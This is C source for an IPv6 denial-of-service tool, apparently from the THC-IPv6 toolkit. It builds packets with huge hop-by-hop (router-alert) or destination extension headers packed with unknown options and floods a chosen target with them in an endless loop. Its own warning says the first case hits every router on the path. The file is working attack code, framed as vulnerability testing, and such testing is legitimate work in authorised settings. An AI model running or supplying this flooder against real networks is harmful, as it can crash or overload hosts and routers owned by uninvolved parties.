
/*
 * Tests various known IPv6 vulnerabilities against a target.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

#define MAX_TEST 2

int rawmode = 0;

void help(char *prg) {
  printf("%s %s (c) 2012 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface destination test-case-number\n\n", prg);
  printf("Performs various denial of service attacks on a target\n");
  printf("If a system is vulnerable, it can crash or be under heavy load, so be careful!\n");
  printf("If not test-case-number is supplied, the list of shown.\n");
//  printf("Use -r to use raw mode.\n");
  printf("\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  int test = 0, count = 1, tmplen;
  unsigned char buf[65536], bla[1500], tests[256];
  unsigned char *dst6, *ldst6 = malloc(16), *src6, *lsrc6, *mcast6, *route6, *mal;
  unsigned char *srcmac = NULL, *dstmac = NULL, *routers[2], null_buffer[6];
  thc_ipv6_hdr *hdr;
  int i, j, k, srcmtu, fragsize;
  unsigned char *pkt = NULL, *pkt2 = NULL, *pkt3 = NULL;
  int pkt_len = 0, pkt_len2 = 0, pkt_len3 = 0, noping = 0, mtu = 1500;
  char *interface;
  thc_ipv6_hdr *ipv6;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  interface = argv[1];
  if ((dst6 = thc_resolve6(argv[2])) == NULL) {
    fprintf(stderr, "Error: invalid target: %s\n", argv[2]);
    exit(-1);
  }
  //route6 = thc_resolve6("2a01::");
  memcpy(ldst6, dst6, 16);
  memset(ldst6 + 2, 0, 6);
  ldst6[0] = 0xfe;
  ldst6[1] = 0x80;
  mcast6 = thc_resolve6("ff02::1");
  if (argc >= 4)
    test = atoi(argv[3]);
  memset(null_buffer, 0, sizeof(null_buffer));

  src6 = thc_get_own_ipv6(interface, dst6, PREFER_GLOBAL);
  if ((lsrc6 = thc_get_own_ipv6(interface, ldst6, PREFER_LINK)) == NULL) {
    fprintf(stderr, "Error: invalid interface: %s\n", interface);
    exit(-1);
  }
  srcmac = thc_get_own_mac(interface);
  if (rawmode == 0) {
    if ((dstmac = thc_get_mac(interface, src6, dst6)) == NULL) {
      fprintf(stderr, "ERROR: Can not resolve mac address for %s\n", argv[2]);
      exit(-1);
    }
  } else
    dstmac = null_buffer;
  if ((srcmtu = thc_get_mtu(interface)) <= 0) {
    fprintf(stderr, "ERROR: can not get mtu from interface %s\n", interface);
    exit(-1);
  }
  fragsize = ((srcmtu - 62) / 8) * 8;

  setvbuf(stdout, NULL, _IONBF, 0);
  memset(buf, 0, sizeof(buf));
  memset(tests, 0, sizeof(tests));
  memset(bla, 0, sizeof(bla));

  if (test < 1 || test > MAX_TEST) {
    printf("%s %s (c) 2012 by %s %s\n\n", argv[0], VERSION, AUTHOR, RESOURCE);
    printf("Syntax: %s interface destination test-case-number\n\n", argv[0]);
    printf("The following test cases are currently implemented:\n");
    printf("  1 : large hop-by-hop header with router-alert and filled with unknown options\n");
    printf("  2 : large destination header filled with unknown options\n");
    exit(0);
  }

  printf("Performing denial of service test case no. %d attack on %s via %s:\n", test, argv[2], argv[1]);
  printf("A \".\" is shown for every 100 packets sent, press Control-C to end...\n");

  /********************** TEST CASES ************************/

  if (test == count) {          // 1432
    printf("Test %d: large hop-by-hop header with router-alert and filled with unknown options.\n", count);
    printf("WARNING: this attack affects all routers on the network path to the target!!\n");
    sleep(3);
    if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    buf[0] = 5;
    buf[1] = 2;
    j = 4;
    i = 2;
    while (j <= 1408) {
      k = (i % 63) + 1;
      buf[j] = k;
      switch (k) {
      case 38:                 // quickstart
        buf[j + 1] = 6;         // length
        buf[j + 2] = 1;         // request type + rate
        buf[j + 3] = 60;        //qs-ttl
        buf[j + 4] = 8;         // nonce
        j += 8;
        break;
      case 5:                  // prevent router alert option twice
        buf[j] = 1;
        // fall through
      default:
        buf[j + 1] = 2;
        j += 4;
      }
      j += buf[j + 1] + 2;
      i++;
    }
    for (i = 1; i < 236; i++) {
      buf[i * 6 - 2] = (i % 63) + 1;
      buf[i * 6 - 1] = 4;
    }
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf, 1416) < 0)
      return -1;
    thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe, bla, 8, 0);
    if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
      return -1;
  }
  count++;

  if (test == count) {          // 1432
    printf("Test %d: large destination header filled with unknown options.\n", count);
    if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    for (i = 1; i < 237; i++) {
      buf[6 + i * 6] = (i % 63) + 1;
      buf[5 + i * 6] = 4;
    }
    if (thc_add_hdr_dst(pkt, &pkt_len, buf, 1416) < 0)
      return -1;
    thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe, bla, 8, 0);
    if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
      return -1;
  }
  count++;

  if (test == count) {          // 1432
    // code
  }
  count++;


  /******************* END OF TESTCASES ***************************/

  count = 0;
  while (1) {
    thc_send_pkt(interface, pkt, &pkt_len);
    usleep(1);
    count++;
    if (count % 100 == 0)
      printf(".");
  }

  return 0;
}
